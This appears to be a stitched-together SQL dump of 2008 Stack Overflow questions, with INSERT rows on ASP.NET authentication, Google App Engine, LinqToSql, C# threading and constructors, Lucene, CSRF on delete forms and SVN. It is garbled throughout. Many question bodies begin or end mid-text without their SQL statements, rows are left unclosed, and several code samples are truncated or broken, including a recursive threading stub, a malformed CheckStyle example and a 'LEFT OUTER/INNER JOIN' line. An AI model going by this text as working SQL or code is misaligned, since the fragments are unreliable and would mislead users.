<p>Any thoughts?  Is one version really better than the other?</p>',122,89,'2008-09-03T00:32:40.333Z',0,22,'javascript','dom',NULL,NULL,NULL,NULL);

However, as it has grown, and features have been added, it has gotten really difficult to keep things organized - mainly due to the fact that this is my first python project, and I didn''t know anything about it until I started working.</p>

<p>What I have:</p>

<ul>
<li>Main Level contains:

<ul>
<li>all .py files (didn''t know how to make packages work)</li>
<li>all .html templates for main level pages</li>
</ul></li>
<li>Subdirectories:

<ul>
<li>separate folders for css, images, js, etc.</li>
<li>folders that hold .html templates for subdirecty-type urls</li>
</ul></li>
</ul>

<p>Example:<br/>
<a href="http://www.bowlsk.com/" rel="noreferrer">http://www.bowlsk.com/</a> maps to HomePage (default package), template at "index.html"<br/>
<a href="http://www.bowlsk.com/games/view-series.html?series=7130" rel="noreferrer">http://www.bowlsk.com/games/view-series.html?series=7130</a> maps to ViewSeriesPage (again, default package), template at "games/view-series.html"</p>

<p>It''s nasty.  How do I restructure?  I had 2 ideas:</p>

<ul>
<li><p>Main Folder containing: appdef, indexes, main.py?</p>

<ul>
<li>Subfolder for code.  Does this have to be my first package?</li>
<li>Subfolder for templates.  Folder heirarchy would match package heirarchy</li>
<li>Individual subfolders for css, images, js, etc.</li>
</ul></li>
<li><p>Main Folder containing appdef, indexes, main.py?</p>

<ul>
<li>Subfolder for code + templates.  This way I have the handler class right next to the template, because in this stage, I''m adding lots of features, so modifications to one mean modifications to the other.  Again, do I have to have this folder name be the first package name for my classes?  I''d like the folder to be "src", but I don''t want my classes to be "src.WhateverPage"</li>
</ul></li>
</ul>

INSERT INTO questions VALUES (50315,'How do you allow multiple file uploads on an internal windows-authentication intranet?','<p>I have a couple of solutions, but none of them work perfectly.</p>

<ol>
<li>ASP.NET / VB.NET / .NET 2.0</li>
<li>IIS 6</li>
<li>IE6 (primarily), with some IE7; Firefox not necessary, but useful</li>
</ol>

<p><em>Allowed 3rd Party Options</em></p>

<ol>
<li>Flash</li>
<li>ActiveX (would like to avoid)</li>
<li>Java (would like to avoid)</li>
</ol>

<p><strong>Current Attempts</strong></p>

<p><em>Gmail Style</em>: You can use javascript to add new Upload elements (input type=''file''), then upload them all at once with the click of a button. This works, but still requires a lot of clicks. (I was able to use an invisible ActiveX control to detect things like File Size, which would be useful.)</p>

<p><em>Flash Uploader</em>: I discovered a couple of Flash Upload controls that use a 1x1 flash file to act as the uploader, callable by javascript. (One such control is <a href="http://digitarald.de/project/fancyupload/" rel="nofollow noreferrer">FancyUpload</a>, another is <a href="http://www.sitepen.com/blog/2008/09/02/the-dojo-toolkit-multi-file-uploader/" rel="nofollow noreferrer">Dojo''s Multiple File Uploader</a>, yet another is one by <a href="http://www.codeproject.com/KB/aspnet/FlashUpload.aspx" rel="nofollow noreferrer">darick_c at CodeProject</a>.) These excited me, but I quickly ran into two issues:</p>

<ol>
<li>Flash 10 will break the functionality that is used to call the multiple file upload dialogue box. The workaround is to use a transparent flash frame, or just use a flash button to call the dialogue box. That''s not a huge deal. </li>
<li>The integrated windows authentication used on our intranet is not used when the Flash file attempts to upload the files, prompting the user for credentials. The workaround for this is to use cookieless sessions, which would be a nightmare for our project due to several other reasons.</li>
</ol>

<p><em>Java Uploader</em>: I noticed several Java-based multiple-file uploaders, but most of the appear to cost money. If I found one that worked really well, I could arrange to purchase it. I''d just rather not. I also don''t like the look of most of them. I liked FancyUpload because it interacted with html/javascript so that I could easily style and manage it any way I want. </p>

<p><em>ActiveX Uploader</em>: I found <a href="http://support.persits.com/xupload/demo1.asp" rel="nofollow noreferrer">an ActiveX solution</a> as well. It appears that ActiveX will work. I would just write my own instead of buying that one. This will be my last resort, I think.</p>

<p><strong>Resolution</strong></p>

<p>I would love to be able to use something like FancyUpload. If I can just get by the credentials prompt some way, it would be perfect. But, from my research, it appears that the only real workaround is cookieless sessions, which I just can''t do. </p>

INSERT INTO questions VALUES (56271,'Context.User losing Roles after being assigned in Global.asax.Application_AuthenticateRequest','<p>I am using Forms authentication in my asp.net (3.5) application. I am also using roles to define what user can access which subdirectories of the app. Thus, the pertinent sections of my web.config file look like this:</p>

<pre><code>&lt;system.web&gt;
  &lt;authentication mode="Forms"&gt;
    &lt;forms loginUrl="Default.aspx" path="/" protection="All" timeout="360" name="MyAppName" cookieless="UseCookies"  /&gt;      
  &lt;/authentication&gt;
  &lt;authorization &gt;

  &lt;/authorization&gt;
&lt;/system.web&gt;

&lt;location path="Admin"&gt;
  &lt;system.web&gt;
    &lt;authorization&gt;
      &lt;allow roles="Admin"/&gt;
      &lt;deny users="*"/&gt;
    &lt;/authorization&gt;
  &lt;/system.web&gt;
&lt;/location&gt;
</code></pre>

<p>Based on what I have read, this should ensure that the only users able to access the Admin directory will be users who have been Authenticated and assigned the Admin role.</p>

<p>User authentication, saving the authentication ticket, and other related issues all work fine. If I remove the  tags from the web.config file, everything works fine. The problem comes when I try to enforce that only users with the Admin role should be able to access the Admin directory.</p>

<p>Based on this <a href="http://support.microsoft.com/kb/311495" rel="nofollow noreferrer">MS KB article</a> along with other webpages giving the same information, I have added the following code to my Global.asax file:</p>

<pre><code>protected void Application_AuthenticateRequest(Object sender, EventArgs e) {
    if (HttpContext.Current.User != null) {
        if (Request.IsAuthenticated == true) {    
            // Debug#1            
            FormsAuthenticationTicket ticket = FormsAuthentication.Decrypt(Context.Request.Cookies[FormsAuthentication.FormsCookieName].Value);
            // In this case, ticket.UserData = "Admin"                
            string[] roles = new string[1] { ticket.UserData }; 
            FormsIdentity id = new FormsIdentity(ticket);
            Context.User = new System.Security.Principal.GenericPrincipal(id, roles);
            // Debug#2
        }
    }
}
</code></pre>

<p>However, when I try to log in, I am unable to access the Admin folder (get redirected to login page). </p>

<p>Trying to debug the issue, if I step through a request, if I execute Context.User.IsInRole("Admin") at the line marked Debug#1 above, it returns a false. If I execute the same statement at line Debug#2, it equals true. So at least as far as Global.asax is concerned, the Role is being assigned properly.</p>

<p>After Global.asax, execution jumps right to the Login page (since the lack of role causes the page load in the admin folder to be rejected). However, when I execute the same statement on the first line of Page_Load of the login, it returns false. So somewhere after Application_AuthenticateRequest in Global.asax and the initial load of the WebForm in the restricted directory, the role information is being lost, causing authentication to fail (note: in Page_Load, the proper Authentication ticket is still assigned to Context.User.Id - only the role is being lost).</p>

<p>What am I doing wrong, and how can I get it to work properly?</p>

We are having a problem that may be specific to WebMethods, but if anyone can point me in a direction of what kinds of things might cause this I''d appreciate it.</p>

<p>When polling two of our partners'' FTP servers, we connect without issue but, when doing a NLST on a directory that is empty (no files and no subdirectories) it''s timing out.  The actual error is:</p>

<blockquote>
  <p>com.wm.net.ftpCException: [ISC.0064.9010] java.net.SocketTimeoutException: Accept timed out</p>
</blockquote>

<p>It''s being thrown during the invocation of the pub.client.ftp:ls service.  I''ve logged in with a number of FTP clients without a problem to the same sites.  I''ve used whatever the default FTP client is in windows, FileZilla and lftp.  All without issue.  The servers themselves aren''t the same FTP server software from what I can tell.  One is Microsoft FTP, the other I''m uncertain on but is definitely not Microsoft.</p>

<p>Any idea what could cause an FTP client to timeout when waiting for a NLST response on an empty directory?  The visible responses from the FTP server appear to be the same, but is there a difference in how NLST responds for an empty directory that I''m unaware of?</p>

<p>This problem is consistent on these two servers.  Everything functions fine on directories with files or subdirectories within it, but not when empty.</p>

<p>From the <a href="http://wiki.apache.org/lucene-java/LuceneFAQ#head-109358021acbfc89456e446740dc2bbf9049950f" rel="nofollow noreferrer">Lucene FAQ</a>, they recommend <a href="http://search.hibernate.org/" rel="nofollow noreferrer">Hibernate Search</a>, <a href="http://www.compass-project.org/" rel="nofollow noreferrer">Compass</a>, and <strike><a href="http://www.dbsight.net/" rel="nofollow noreferrer">DBSight</a></strike>.</p>

<p>As a background of our current technology stack, we are using straight JSPs on Tomcat, no Hibernate, no other frameworks on top of it... just straight Java, JSP, and JDBC against a DB2 database.</p>

<p>Given that, it seems Hibernate Search might be a bit more difficult to integrate into our system, though it might be nice to have the option of using Hibernate after such an integration.</p>

<p>Does anyone have any experiences they can share with using one of these tools (or other similar Lucene based solutions) that might help in picking the right tool?</p>

<p>It needs to be a FOSS solution, and ideally will manage updating Lucene with changes from the database automagicly (though efficiently), without extra effort to notify the tool when changes have been made (otherwise, it seems rolling my own Lucene solution would be just as good).  Also, we have multiple application servers with just 1 database (+failover), so it would be nice if it is easy to use the solution from all application servers seamlessly.</p>

<p>I am continuing to inspect the options now, but it would be really helpful to utilize other people''s experiences.</p>',122,42,'2008-09-17T18:54:47.990Z',12,52,'database','lucene','integration','hibernate-search',NULL,NULL);

One thing it allows is tracking which pins were knocked down on each ball.  To display this information, I make it look like a rack of pins:</p>
<pre>o o o o
 o o o
  o o
   o</pre>
<p>Images are used to represent the pins.  So, for the back row, I have four <em>img</em> tags, then a <em>br</em> tag. It works great... mostly.  The problem is in small browsers, such as IEMobile.  In this case, where there are may 10 or 11 columns in a table, and there may be a rack of pins in each column, Internet Explorer will try to shrink the column size to fit on the screen, and I end up with something like this:</p>

<h3>Follow-up/Summary</h3>
<p>I have received and tried several good suggestions, including:</p>
<ul>
<li>Dynamically generate the whole image on the server. It is a good solution, but doesn''t really fit my need (hosted on <a href="https://en.wikipedia.org/wiki/Google_App_Engine" rel="nofollow noreferrer">GAE</a>), and a bit more code than I''d like to write.  These images could also be cached after the first generation.</li>
<li>Use CSS white-space declaration. It is a good standards-based solution, but it fails miserably in the IEMobile view.</li>
</ul>
<h3>What I ended up doing</h3>
<em>*hangs head and mumbles something*</em>
<p>Yes, that''s right, a transparent GIF at the top of the div, sized to the width I need.  End code (simplified) looks like:</p>
<pre><code>&lt;table class=&quot;game&quot;&gt;

        &lt;!-- ... --&gt;
    &lt;/tr&gt;
&lt;/table&gt;

</code></pre>

<p>The caveat here is that I need to create an object that <strong>has</strong> to be disposed after use. (Clarification: Not immediately, but I have to call Dispose() rather than waiting for Garbage Collection)</p>

<p>However, I did not see a way to just call the base constructor again if I add some code inside my overloaded constructor. Is there a way to call the base constructor from within an overloaded one?</p>

<p>Or is it possible to use</p>

<pre><code>public MyClass(MyOtherClass inputObject): this(inputObject.ID,
                                               inputObject.CreateHelper().Text) 
{}
</code></pre>

<p>Would this automatically Dispose the generated Object from CreateHelper()?</p>

<p><strong>Edit:</strong> Thanks so far. Two problems: I do not control MyOtherClass and I do not have Extension Methods (only .NET 3.0...). I do control my own class though, and since I''ve just started writing it, I have no problem refactoring the constructors if there is a good approach.</p>',91,32,'2008-09-20T23:06:48.647Z',14,58,'c#','.net',NULL,NULL,NULL,NULL);

The user should get to step 4 while step 3 is still in progress, and the screen on step 4 will periodically update to let the user know when the import is complete.</p>

<pre><code>public class Import {

  public static void ImportPendingFile() {
    Import i = new Import();
    Thread newThread = new Thread(new ThreadStart(i.ImportFile));
    newThread.Start();

  Import.ImportPendingFile();

<p>When doing this, I am able to confirm via debugger that the new thread is starting up properly. However, whenever I do this, the thread aborts when trying to access the file (step 2 in the code behind). This works fine when run in the main thread, so something about the multi-threaded situation is preventing this. I had thought that since the file is saved to disk (which it is) that there shouldn''t be any problem with opening it up in a different thread. Any ideas where I have gone wrong and how I can fix it?

<p>However, it seems that the standard for .NET is to create a new delegate and <code>EventArgs</code> subclass for each type of event.  Is there something wrong with my generic approach?
<hr/>
EDIT: The reason for this post is that I just re-created this in a new project, and wanted to make sure it was ok.  Actually, I was re-creating it as I posted.  I found that there is a generic <code>EventHandler&lt;TEventArgs></code>, so you don''t need to create the generic delegate, but you still need the generic <code>EventArgs&lt;T></code> class, because <code>TEventArgs: EventArgs</code>.
<hr/>
Another EDIT: One downside (to me) of the built-in solution is the extra verbosity:</p>

<pre><code>public event EventHandler&lt;EventArgs&lt;Foo&gt;&gt; FooChanged;
</code></pre>

<p>vs.</p>

<pre><code>public event EventHandler&lt;Foo&gt; FooChanged;
</code></pre>

<p>It can be a pain for clients to register for your events though, because the System namespace is imported by default, so they have to manually seek out your namespace, even with a fancy tool like Resharper...  Anyone have any ideas pertaining to that?</p>',96,48,'2008-09-24T19:50:41.813Z',1,4,'c#','.net','generics','events',NULL,NULL);

INSERT INTO questions VALUES (133515,'Autogeneration of a DataContext designer file when using SqlMetal and Visual Studio','<p>I am using <a href="http://msdn.microsoft.com/en-us/library/bb386987.aspx" rel="noreferrer">SqlMetal</a> to general my DataContext.dbml class for my ASP.net application using LinqToSql. When I initially created the DataContext.dbml file, Visual Studio used this to create a related DataContext.designer.cs file. This designer file contains the DataContext class in C# that is used throughout the app (and is derived from the XML in the dbml file) and is essential to bridging the gap between the output of SqlMetal and using the DataContext with LinqToSql.</p>

<p>However, when I make a change to the database and recreate the dbml file, the designer file never gets regenerated in my website. Instead, the old designer file is maintained (and therefore none of the changes to the DBML file are accessible through the LinqToSql DataContext class).</p>

<p>The only process I have been able to use so far to regenerate the designer file is</p>

<ol>
<li>Go to Windows Explorer and delete both the dbml and designer.cs files</li>
<li>Go to Visual Studio and hit Refresh in the Solution Explorer. The dbml and designer.cs files now disappear from the project.</li>
<li>Regenerate the dbml file using SqlMetal</li>
<li>Go to Visual Studio and hit Refresh in the Solution Explorer. Now the designer.cs file is recreated.</li>
</ol>

<p>It seems that Visual Studio will only generate the designer.cs file when a new dbml file is detected that does not yet have a designer.cs file. This process is pretty impractical, since it involves several manual steps and messes things up with source control.</p>

<p>Does anyone know how I can get the designer.cs file automatically regenerated without having to follow the manual delete/refresh/regenerate/delete process outlined above?</p>',51,31,'2008-09-25T14:00:59.337Z',21,9,'asp.net','visual-studio-2008','linq-to-sql','dbml','sqlmetal',NULL);

Ideally the user is going to click on an icon next to a text box that will pop up the form, they will select the department they need, and when they click OK, the dialog will close and I will have the value selected for me to update the textbox with.</p>

<p>I''ve already done the route with passing the owner of the dialog box into the dialog form and having the OK button click event do the proper update, but this forces me to do a DirectCast to the form type and I can then only reuse the picker on the current form.</p>

<p>I have been able to use a ByRef variable in the constructor and successfully update a value, but it works only in the constructor. If I attempt to assign the ByRef value to some internal variable in the Department Picker class, I lose the reference aspect of it. This is my basic code attached to my form:
</p>

<pre><code>Public Class DeptPicker

   Private m_TargetResult As String

   Public Sub New(ByRef TargetResult As String)

      InitializeComponent()

      '' This works just fine, my "parent" form has the reference value properly updated.
      TargetResult = "Booyah!"

      '' Once I leave the constructor, m_TargetResult is a simple string value that won''t update the parent
      m_TargetResult = TargetResult

   End Sub

   Private Sub btnOK_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnOK.Click

      DialogResult = Windows.Forms.DialogResult.OK

      '' I get no love here. m_TargetResult is just a string and doesn''t push the value back to the referenced variable I want.
      m_TargetResult = "That department I selected."
      Me.Close()

INSERT INTO questions VALUES (153732,'How do I break up high-cpu requests on Google App Engine?','<p>To give an example of the kind of request that I can''t figure out what else to do for:</p>

<p>The application is a <a href="http://www.bowlsk.com" rel="nofollow noreferrer">bowling score/stat tracker</a>.  When someone enters their scores in advanced mode, a number of stats are calculated, as well as their score.  The data is modeled as:</p>

<p>Game - members like name, user, reference to the bowling alley, score
Frame - pinfalls for each ball, boolean lists for which pins were knocked down on each ball, information about the path of the ball (stance, target, where it actually went), the score as of that frame, etc
GameStats - stores calculated statistics for the entire game, to be merged with other game stats as needed for statistics display across groups of games.</p>

<p>An example of this information in practice can be found <a href="http://www.bowlsk.com/games/view-series.html?series=13717" rel="nofollow noreferrer">here</a>.</p>

<p>When a game is complete, and a frame is updated, I have to update the game, the frame, every frame after it and possibly some before it (to make sure their scores are correct), and the stats.  This operation always flags the CPU monitor.  Even if the game isn''t complete, and statistics don''t need to be calculated, the scores and such need to be updated to show the real-time progress to the user, and so these also get flagged.  The average CPU time for this handler is over 7000 mcycles, and it doesn''t even display a view.  Most people bowl 3 to 4 games per series - if they are entering their scores realtime, at the lanes, that''s about 1 request every 2 to 4 minutes, but if they write it all down and enter it later, there are 30-40 of these requests being made in a row.</p>

What I''m trying to say is, I don''t believe there is a single correct answer and I''m not intentionally trying inflame partisan bickering.

<p><strong>Are their any specific alternatives to the GOF Singleton Pattern?</strong></p>

<p>For example, many times when I have used the singleton pattern in the past, I am simply interested in preserving the state/values of one or several variables.  The state/values of variables, however, can be preserved between each instantiation of the class using <strong>static variables</strong> instead of using the singleton pattern.</p>

<p>I was under the impression that this was an automated replacement for manually running <strong>InstallUtil.exe</strong> against the assembly containing the WMI provider, but changes I make to the provider are not recognised by the Windows WMI infrastructure unless I manually run InstallUtil from the command prompt. I can do this on my own machine during development, but if an application using the provider is deployed to other machines - what then?</p>

<p>I wonder, is there a fast way to convert between distinguishedName and userPrincipalName? Or is there a faster way to search for a user if I only have the distinguishedName to work with?</p>

<p><strong>Edit:</strong> Thanks to the answer! Searching the Manager-Field improved the function from 90 Seconds to 4 Seconds. Here is the new and improved code, which is faster and more readable (note that there is most likely a bug in the elapsedTime functionality, but the actual core of the function works):</p>

{
    Collection&lt;string&gt; result = new Collection&lt;string&gt;();

<p>I got a Sharepoint 2007 Server. Pretty standard stuff: Windows 2003 (32-Bit), IIS 6, Sharepoint 2007, .net 3.0.</p>

<p>At the moment, I use Visual Studio 2005 with .net 3.0 as my target. However, I''d like to use .net 3.5SP1 Functionality because of some really nice additions.</p>

<p>Now, to my understanding, .net 3.0 and 3.5 are "only" .net 2.0 + some new Assemblies (greatly simplyfied), and therefore I wonder if I can just happily install the 3.5SP1 Framework on all Sharepoint Servers and use them - or is there any additional black magic needed to prevent the whole stuff from blowing up?</p>

<p>I assume that I will need to update to Visual Studio 2008 SP1, which is fine. Is it required to recompile any code? Can I safely reference the "old" assemblies from newly written ones? Or is there any big incompatibility that I have not found?</p>',91,54,'2008-10-10T21:35:00.350Z',71,71,'.net',NULL,NULL,NULL,NULL,NULL);

<ol>
<li>Anyone can see a user''s public object, and the db.Model id is used in the request to figure out which object to show.  Malicious user now has the id.</li>
<li>Malicious user creates their own object and checks out the delete form.  They now know how to delete an object with a certain id.</li>
<li>Malicious user gets innocent user to submit a delete request for that user''s object.</li>
</ol>

<p>What steps can I add to prevent #3?  Note that when I say ID, I am using the actual ID part of the key.  One idea I had was to use the full key value in delete requests, but would that prevent a malicious user from being able to figure this out?  As far as I know, the key is some combination of the model class type, the app id, and the object instance id, so they could probably derive the key from the id if they wanted to.</p>

<p>Any other ideas?  Jeff wrote <a href="http://www.codinghorror.com/blog/archives/001171.html" rel="noreferrer">a post about this</a>, and suggested a couple methods - a hidden form value that would change on each request, and a cookie value written via js to the form.  I won''t want to exclude non-javascript users, so the cookie solution is no good - for the hidden form value, I would have to do a datastore write on every request that displayed a deletable object - not an ideal situation for a scalable app!</p>

INSERT INTO questions VALUES (269594,'LinqToSql Producing Different Sql Queries on Different Machines for Identical Code','<p>I have a website built using Asp.net and LinqToSql for Data Access. In a certain section of the site, LinqToSql produces a query that looks like this (from my dev machine):</p>

<pre><code>select ...
from table1
left outer join table2 on table1 where ...
left outer join table3 on table2 where ...
</code></pre>

<p>Since the connection between table2 and table1 is not always there, the left outer join is appropriate in this situation. And since the link between table3 and table1 goes through table2, it also needs a left outer join. This sql returns the correct recordset.</p>

<p>I just put the code up to a server. Running the identical code in the same scenario, LinqToSql produces the following query:</p>

<pre><code>select ...
from table1
left outer join table2 on table1 where ...
join table3 on table2 where ...
</code></pre>

<p>For some reason, it renders the join between table2 and table3 as an inner join, instead of an outer join. This results in zero records being returned from the query.</p>

<p>Both dev machine and server are using .Net 3.5 SP1. Dev machine is Vista64, Server is Windows Server 2003 SP2. A colleague of mine using Windows XP PRO also confirmed the same correct behavior on their dev machine. </p>

<p>Can anyone think of a reason why the server would create different sql? How can I fix this? It seems to be something tied into the way that Linq and .Net is running on the server. However, I can''t think of any way to confirm and fix this.</p>

<hr>

<p>Linq Code (I am only including the parts that are relevant to the section where the sql changed):</p>

<pre><code>from Import_Table t in db.Import_Tables
select new {
   CheckedOutUser = (!t.IsCheckedOut) ? "--" : t.Import_CheckoutHistory.System_User.FirstName + " " + t.Import_CheckoutHistory.System_User.LastName,
   CheckedOutUserID = (!t.IsCheckedOut) ? 0 : t.Import_CheckoutHistory.System_UserID};
</code></pre>

<p>In the context of the description above, table1 = Import_Table, table2 = Import_CheckoutHistory, table3 = System_User. If I comment out the line here that begins with "CheckedOutUser = ..." then it works on the server - so this is definitely the culprit.</p>

<p>Actual sql returned:</p>

<pre><code>SELECT 
  (CASE WHEN NOT ([t0].[IsCheckedOut] = 1) THEN CONVERT(NVarChar(401),''--'') ELSE ([t2].[FirstName] + '' '') + [t2].[LastName] END) AS [CheckedOutUser], 
  (CASE WHEN NOT ([t0].[IsCheckedOut] = 1) THEN 0 ELSE [t1].[system_UserID] END) AS [CheckedOutUserID]
FROM [dbo].[import_Table] AS [t0] 
LEFT OUTER JOIN [dbo].[import_CheckoutHistory] AS [t1] ON [t1].[import_CheckoutHistoryID] = [t0].[import_CheckoutHistoryID] 
LEFT OUTER/INNER JOIN [dbo].[system_User] AS [t2] ON [t2].[system_UserID] = [t1].[system_UserID]

INSERT INTO questions VALUES (282613,'ASP.net Profiles and Membership - Custom Providers or should completely I roll my own?','<p>first off, I know that this question could be borderline-duplicate <a href="https://stackoverflow.com/questions/1683/">to this one</a>, and yes, it is a bit ironic that I am asking a question for something that I even answered myself.</p>

<p>Now, I am talking about ASP.net Profiles. I am building an application using MVC if that matters, and I believe that the built-in Profile Provider is useless.</p>

<p>So at the moment, I am asking myself: Should I follow my own advice and write a Custom Profile Provider, or should I completely roll my own Profile stuff?</p>

<p>Some assumptions:</p>

<ul>
<li>I want my data in a database structure that I decide</li>
<li>It''s a brand new application, no legacy database structure or userbase that needs to be integrated</li>
<li>Small to Mid-Sized amount of users (max. ~5000 users)</li>
<li>ASP.net MVC, most likely Silverlight 2 and maybe even some Windows Azure, but I am still experimenting with it, but definitely .net 3.5 SP1.</li>
<li>And, possibly as the main decision point: Not neccessarily using Forms Auth, the application may eventually use Active Directory or OpenID for Authentication</li>
</ul>

<p>I still need to investigate if I can use ASP.net Membership with non-standard authentication providers (OpenID), because I think that ASP.net Profiles only make sense when I use ASP.net Membership, so I might eventually end up writing both a custom Membership Provider for OpenID (That essentially just serves as a bridge), and a custom Profile Provider.</p>

<p>So yeah, I think that that might be a good way because I continue to use what the framework already gives me, but I have next to no experience with Membership and Profiles, so maybe someone here has some insight whether or not I should completely roll my own Authentication and/or Profiles, or if I am better off writing custom Membership and Profile Providers, which apparently is <a href="https://stackoverflow.com/questions/264272/">what SO did</a>?</p>',91,16,'2008-11-12T00:22:19.053Z',64,56,'.net','asp.net','membership-provider',NULL,NULL,NULL);

<p>How can I get the wrap div to always fill the cell, so that the management area sits at the bottom of the cell?  And yes, the data that I am putting in the table is (in my mind) tabular, so I would like to use a table here.  As a last resort, I may turn to an ugly nested div solution, but since a table is semantically correct here I''d like to use one if possible.  Note that the background colors are simply to show the relative sizes of the elements - I don''t care about background for my layout.  Also note that I''d like the cells to have a flexible height, so that they only expand enough to fit their content.</p>',96,47,'2008-11-14T21:43:26.917Z',27,94,'html','css',NULL,NULL,NULL,NULL);

<p>So naturally, the question is: "When to use a Property with some code in the getter, and when to use a function?", and <a href="https://stackoverflow.com/questions/67063/">that question was already answered</a>.</p>

<p>Now, I wonder about one thing though: If - against all expectations - I ever needed to make this Getter so complicated that it should be a function (for example, because I need to put data in or because it can throw an exception or whatever), is it easy to change a Property into a Method?</p>

<p>Of course, it seems really trivial, just changing</p>

<strong>Hack 1:</strong> I rollout a change that sends the data to a different table for later viewing. Also, the SQL Admin can see the data, which breaks the requirement.</p>

<p><strong>Scenario II:</strong> Encrypt the data so that it requires a password to decrypt. This password would be known by the users only. It would be required each time a new record is created as well as each time the data from an old record was retrieved. The encryption/decryption would happen in JavaScript so that the password would never be sent to the server, where it could be logged or sniffed.<br>
<strong>Hack II:</strong> Rollout a change that logs keypresses in javascript and posts them back to the server so that I can retrieve the password. Or, rollout a change that simply stores the unecrypted data in a hidden field that can be posted to the server for later viewing.</p>

<p><strong>Scenario III:</strong> Do the same as Scenario II, except that the encryption/decryption happens on a website that we do not control. This magic website would allow a user to input a password and the encrypted or plain-text data, then use javascript to decrypt or encrypt that data. Then, the user could just copy the encrypted text and put the in the field for new records. They would also have to use this site to see the plain-text for old records.<br>

INSERT INTO questions VALUES (318761,'Registering derived classes with reflection, good or evil?','<p>As we all know, when we derive a class and use polymorphism, someone, somewhere needs to know what class to instanciate. We can use factories, a big switch statement, if-else-if, etc. I just learnt from Bill K this is called Dependency Injection.</p>

<p><strong>My Question: Is it good practice to use reflection and attributes as the dependency injection mechanism?</strong> That way, the list gets populated dynamically as we add new types.</p>

<p>Here is an <strong>example</strong>. <em>Please no comment about how loading images can be done other ways, we know</em>.</p>

<p>Suppose we have the following IImageFileFormat interface:</p>

<pre><code>public interface IImageFileFormat
{
   string[] SupportedFormats { get; };
   Image Load(string fileName);
   void Save(Image image, string fileName);
}
</code></pre>

<p>Different classes will implement this interface:</p>

<pre><code>[FileFormat]
public class BmpFileFormat : IImageFileFormat { ... }

[FileFormat]
public class JpegFileFormat : IImageFileFormat { ... }
</code></pre>

<p>When a file needs to be loaded or saved, a manager needs to iterate through all known loader and call the Load()/Save() from the appropriate instance depending on their SupportedExtensions.</p>

<pre><code>class ImageLoader
{
   public Image Load(string fileName)
   {
      return FindFormat(fileName).Load(fileName);
   }

   public void Save(Image image, string fileName)
   {
      FindFormat(fileName).Save(image, fileName);
   }

   IImageFileFormat FindFormat(string fileName)
   {
      string extension = Path.GetExtension(fileName);
      return formats.First(f =&gt; f.SupportedExtensions.Contains(extension));
   }

   private List&lt;IImageFileFormat&gt; formats;
}
</code></pre>

<p>I guess the important point here is whether the list of available loader (formats) should be populated by hand or using reflection.</p>

<p>By hand:</p>

<pre><code>public ImageLoader()
{
   formats = new List&lt;IImageFileFormat&gt;();
   formats.Add(new BmpFileFormat());
   formats.Add(new JpegFileFormat());
}
</code></pre>

<p>By reflection:</p>

<pre><code>public ImageLoader()
{
   formats = new List&lt;IImageFileFormat&gt;();
   foreach(Type type in Assembly.GetExecutingAssembly().GetTypes())
   {
      if(type.GetCustomAttributes(typeof(FileFormatAttribute), false).Length &gt; 0)
      {
         formats.Add(Activator.CreateInstance(type))
      }
   }
}
</code></pre>

<p>I sometimes use the later and it never occured to me that it could be a very bad idea. Yes, adding new classes is easy, but the mechanic registering those same classes is harder to grasp and therefore maintain than a simple coded-by-hand list.</p>

INSERT INTO questions VALUES (327223,'Memory Efficient Alternatives to Python Dictionaries','<p>In one of my current side projects, I am scanning through some text looking at the frequency of word triplets.  In my first go at it, I used the default dictionary three levels deep.  In other words, <code>topDict[word1][word2][word3]</code> returns the number of times these words appear in the text, <code>topDict[word1][word2]</code> returns a dictionary with all the words that appeared following words 1 and 2, etc.</p>

<p>This functions correctly, but it is very memory intensive.  In my initial tests it used something like 20 times the memory of just storing the triplets in a text file, which seems like an overly large amount of memory overhead.</p>

<p>My suspicion is that many of these dictionaries are being created with many more slots than are actually being used, so I want to replace the dictionaries with something else that is more memory efficient when used in this manner.  I would strongly prefer a solution that allows key lookups along the lines of the dictionaries.</p>

<p>From what I know of data structures, a balanced binary search tree using something like red-black or AVL would probably be ideal, but I would really prefer not to implement them myself.  If possible, I''d prefer to stick with standard python libraries, but I''m definitely open to other alternatives if they would work best.</p>

<p>So, does anyone have any suggestions for me?</p>

<p>Edited to add:</p>

<p>Thanks for the responses so far.  A few of the answers so far have suggested using tuples, which didn''t really do much for me when I condensed the first two words into a tuple.  I am hesitant to use all three as a key since I want it to be easy to look up all third words given the first two.  (i.e. I want something like the result of <code>topDict[word1, word2].keys()</code>).  </p>

The results of parsing the first thousand pages, for example, is something like 11MB for a text file where each line is the three words and the count all tab separated.  Storing the text in the dictionary format I am now using takes around 185MB.

<p>I wonder if there is a way to check out a Directory from SVN and store it in a (new) repository on the Laptop, work against that, and then merge that repository with the main one later. (Yes, I know that this would be a good case for distributed systems a la git or Mercurial, but I don''t want to lose VisualSVN/TortoiseSVN).</p>

<p>I am not really sure what I am looking for, but I guess I am looking for branching and merging between two repositories: Branch the tree off repo1 into repo2, then merge it back. The caveat here: I''d like to keep the history from repo2. So if I made 10 commits against repo2, I''d like to transfer those 10 commits into repo1 as well, so that I am still able to go back.</p>

<p>Is that even possible, or am I better off still copying the whole repository every time? (It sits in a VM anyway, which means that I copy the whole VM every time).</p>',91,47,'2008-12-02T13:47:28.883Z',96,57,'svn',NULL,NULL,NULL,NULL,NULL);

<p>We talked internally about two systems: 
  1. In SQL 2005, use object permissions to restrict you from altering an object until you did a "checkout". Then, the checkin procedure would script it into the SCM.
  2. Run a scheduled job to detect any changes and commit them (anonymously) to SCM.</p>

<p>The problem I''m having is that randomly the Images property gets cleared on those forms that reference the image list on the main form.</p>

<p>This seemed to have only start recently, but I haven''t been able to pinpoint the exact cause yet. I can''t seem to find a way to reproduce the issue at will; it just seems to happen randomly. I did notice it happens right when a form is opened. </p>

<p>One thing that I did change recently in Delphi is I enabled the Autosave Project desktop and symbols feature. So now when I open this project it always remembers what forms were open. So because this issue happens when a form is opened, and because it now reopens all forms that were opened the last time the project was opened, it happens more often.</p>

<p>We have a few developers working on this project, and we are using SVN for version control. One issue that enabling the Autosave Project desktop and symbols feature has led to is that when we do an SNV update on the project, the symbol file can become invalid (because we don''t have the symbol file under version control). This just leads to an error message from Delphi, but other than that it seems harmless. We just recompile the project and it fixes the symbol file.</p>

One of the style rules we opted to include was the <em>NeedBraces</em> module.</p>

<p><em><a href="http://checkstyle.sourceforge.net/config_blocks.html#NeedBraces" rel="nofollow noreferrer">NeedBraces</a></em> specifies that every block type statement (such as <code>if</code>, <code>else</code>, <code>for</code>) must have opening and closing curly braces.  However, as far as I can tell it isn''t working entirely correctly.</p>

<p>This example will trigger a CheckStyle error.</p>

<pre><code>    if (true)

        System.out.println("20");   
    }
